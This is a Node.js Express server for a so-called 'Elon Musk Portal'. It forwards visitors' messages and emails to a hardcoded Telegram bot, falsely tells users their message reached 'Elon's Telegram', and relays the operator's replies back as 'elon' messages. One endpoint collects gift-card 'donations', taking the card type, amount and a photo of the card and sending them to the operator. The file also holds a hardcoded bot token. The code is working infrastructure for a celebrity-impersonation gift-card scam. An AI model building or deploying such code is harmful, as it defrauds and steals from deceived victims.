const express = require('express');
const axios = require('axios');
const cors = require('cors');
const path = require('path');
const app = express();

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const BOT_TOKEN = process.env.BOT_TOKEN || '8740257888:AAEAq1XFJfzDETV91Qt2EWdf0OUvLcD86Hg';
const CHAT_ID = process.env.CHAT_ID || '8425923232';

const userSessions = new Map();
const messageHistory = new Map();

// Health check
app.get('/api', (req, res) => {
    res.json({ status: 'Elon Musk Portal API Running', timestamp: new Date() });
});

// Send message to Telegram
app.post('/api/send-message', async (req, res) => {
    const { message, userId, userName, userEmail } = req.body;
    const sessionId = userId || Date.now().toString();
    
    try {
        const text = `🚀 *NEW MESSAGE FROM PORTAL*\n\n` +
                    `👤 *From:* ${userName || 'Fan'}\n` +
                    `🆔 *ID:* ${sessionId}\n` +
                    `📧 *Email:* ${userEmail || 'N/A'}\n\n` +
                    `💬 *Message:*\n${message}\n\n` +
                    `─────────────────────\n` +
                    `Reply to this message to respond.`;
        
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'Markdown'
        });
        
        // Store message
        if (!messageHistory.has(sessionId)) {
            messageHistory.set(sessionId, []);
        }
        messageHistory.get(sessionId).push({
            type: 'user',
            text: message,
            time: Date.now()
        });
        
        userSessions.set(sessionId, {
            lastMessage: Date.now(),
            replied: false
        });
        
        res.json({ 
            success: true, 
            sessionId: sessionId,
            autoReply: "✅ Message delivered to Elon's Telegram! He typically responds within 2-4 hours. Your conversation is saved and secure."
        });
        
    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ success: false, error: 'Failed to send' });
    }
});

// Send gift card to Telegram
app.post('/api/send-giftcard', async (req, res) => {
    const { type, amount, userId, userName, imageData } = req.body;
    const sessionId = userId || Date.now().toString();
    
    try {
        const caption = `🎁 *GIFT CARD DONATION RECEIVED*\n\n` +
                       `👤 *From:* ${userName || 'Anonymous'}\n` +
                       `🆔 *ID:* ${sessionId}\n` +
                       `💳 *Type:* ${type}\n` +
                       `💰 *Amount:* $${amount}\n\n` +
                       `─────────────────────\n` +
                       `Gift card image attached below.`;
        
        // Send text first
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: caption,
            parse_mode: 'Markdown'
        });
        
        // If image data exists, send it
        if (imageData) {
            const base64Data = imageData.replace(/^data:image\/\w+;base64,/, '');
            const buffer = Buffer.from(base64Data, 'base64');
            
            const FormData = require('form-data');
            const form = new FormData();
            form.append('chat_id', CHAT_ID);
            form.append('photo', buffer, { filename: 'giftcard.jpg' });
            form.append('caption', `Gift Card: ${type} - $${amount}`);
            
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
                headers: form.getHeaders()
            });
        }
        
        res.json({ success: true, message: 'Gift card submitted successfully!' });
        
    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ success: false, error: 'Failed to send gift card' });
    }
});

// Get chat history
app.get('/api/history/:userId', (req, res) => {
    const history = messageHistory.get(req.params.userId) || [];
    res.json({ history });
});

// Check for replies (long polling)
app.get('/api/check-reply/:userId', (req, res) => {
    const session = userSessions.get(req.params.userId);
    const history = messageHistory.get(req.params.userId) || [];
    
    // Find Elon's replies that haven't been delivered
    const pendingReplies = history.filter(m => m.type === 'elon' && !m.delivered);
    
    if (pendingReplies.length > 0) {
        pendingReplies.forEach(m => m.delivered = true);
        res.json({ hasReply: true, replies: pendingReplies });
    } else {
        res.json({ hasReply: false });
    }
});

// Telegram webhook for replies
app.post('/api/webhook', async (req, res) => {
    const { message } = req.body;
    
    if (message && message.reply_to_message && message.from.id.toString() === CHAT_ID) {
        const originalText = message.reply_to_message.text;
        const idMatch = originalText.match(/🆔 \*ID:\* (\d+)/);
        
        if (idMatch) {
            const userId = idMatch[1];
            
            if (!messageHistory.has(userId)) {
                messageHistory.set(userId, []);
            }
            
            messageHistory.get(userId).push({
                type: 'elon',
                text: message.text,
                time: Date.now(),
                delivered: false
            });
            
            // Also update session
            userSessions.set(userId, {
                lastMessage: Date.now(),
                replied: true,
                lastReply: message.text
            });
            
            console.log(`Reply stored for user ${userId}: ${message.text}`);
        }
    }
    
    res.sendStatus(200);
});

// Store user ID mapping
app.post('/api/register-user', (req, res) => {
    const { userId } = req.body;
    if (!messageHistory.has(userId)) {
        messageHistory.set(userId, []);
    }
    res.json({ success: true });
});

// Serve frontend
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});
